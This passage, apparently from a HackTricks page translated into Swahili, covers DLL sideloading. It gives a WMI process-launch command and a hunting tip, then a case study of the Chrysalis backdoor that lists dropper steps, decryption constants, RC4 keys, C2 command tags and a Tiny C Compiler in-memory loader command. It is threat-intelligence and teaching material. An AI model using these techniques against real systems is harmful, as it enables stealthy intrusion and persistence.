- `curl -s -L` inaficha progress na inafuata redirects; `tar -xf` inatumia tar iliyojengwa ndani ya Windows.

- **WMI/CIM launch:** Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Inafanya kazi na binaries zinazopendelea DLL za ndani (mfano, `intelbq.exe`, `nearby_share.exe`); payload (mfano, Remcos) inakimbia chini ya jina lenye kuaminika.

- **Hunting:** Weka alarmi kwa `forfiles` wakati `/p`, `/m`, na `/c` zinaonekana pamoja; si ya kawaida nje ya scripts za admin.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uingiliaji wa hivi karibuni wa Lotus Blossom ulitumia mnyororo wa masasisho uliothibitishwa kuwasilisha dropper iliyo-pack na NSIS ambayo ilipanga DLL sideload pamoja na payloads zilizotekelezwa kabisa katika memory.

Tradecraft flow
- `update.exe` (NSIS) inaunda `%AppData%\Bluetooth`, inamarka **HIDDEN**, inaang'oa Bitdefender Submission Wizard iliyobadilishwa jina `BluetoothService.exe`, `log.dll` ya uharibu, na encrypted blob `BluetoothService`, kisha inafungua EXE.
- Host EXE ina-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` ina-decrypt kutumia stream maalum ya LCG (constants **0x19660D** / **0x3C6EF35F**, nyenzo za key zinatokana na hash ya awali), inaandika buffer na shellcode ya plaintext, ina-release temps, na inaruka kwa hiyo.
- Ili kuepuka IAT, loader inaleta APIs kwa ku-hash majina ya export kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha na salted target hashes.

Main shellcode (Chrysalis)
- Inadecrypt module kuu kama PE kwa kurudia add/XOR/sub na key `gQ2JR&9;` kwa pass tano, kisha ina-load kwa dynamic `Kernel32.dll` → `GetProcAddress` kumaliza import resolution.
- Inajenga upya strings za majina ya DLL wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha ina-load `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Inatumia resolver ya pili inayopita **PEB → InMemoryOrderModuleList**, inachambua kila export table katika blocks za 4-byte kwa Murmur-style mixing, na inarudi kwa `GetProcAddress` tu ikiwa hash haipatikani.

Embedded configuration & C2
- Config ipo ndani ya faili iliyodondolewa `BluetoothService` katika **offset 0x30808** (kiasi **0x980**) na ime-RC4-decrypted kwa key `qwhvb^435h&*7`, ikifichua URL ya C2 na User-Agent.
- Beacons hutoa profile ya host iliyogawishwa kwa nukta, huingiza tag `4Q` mbele, kisha zina-RC4-encrypt kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` juu ya HTTPS. Majibu yana-RC4-decrypt na yanapelekwa kwa tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + kesi za chunked transfer).
- Mode ya utekelezaji inaamishwa na CLI args: hakuna args = install persistence (service/Run key) inayorejea kwa `-i`; `-i` inarudisha kuendesha tena yenyewe na `-k`; `-k` inaruka install na inakimbia payload.

Alternate loader observed
- Uingiliaji uleule uliang'oa Tiny C Compiler na ukatekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, na `libtcc.dll` kando yake. Chanzo cha C kilichotolewa na mdukuzi kilijumuisha shellcode, kilikusanywa, na kukimbia katika memory bila kugusa diski na PE. Rudia kwa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Awamu hii ya TCC-based compile-and-run iliingiza `Wininet.dll` wakati wa runtime na ikavuta shellcode ya awamu ya pili kutoka kwa hardcoded URL, ikitoa loader yenye kubadilika ambayo inajifanya kuwa compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
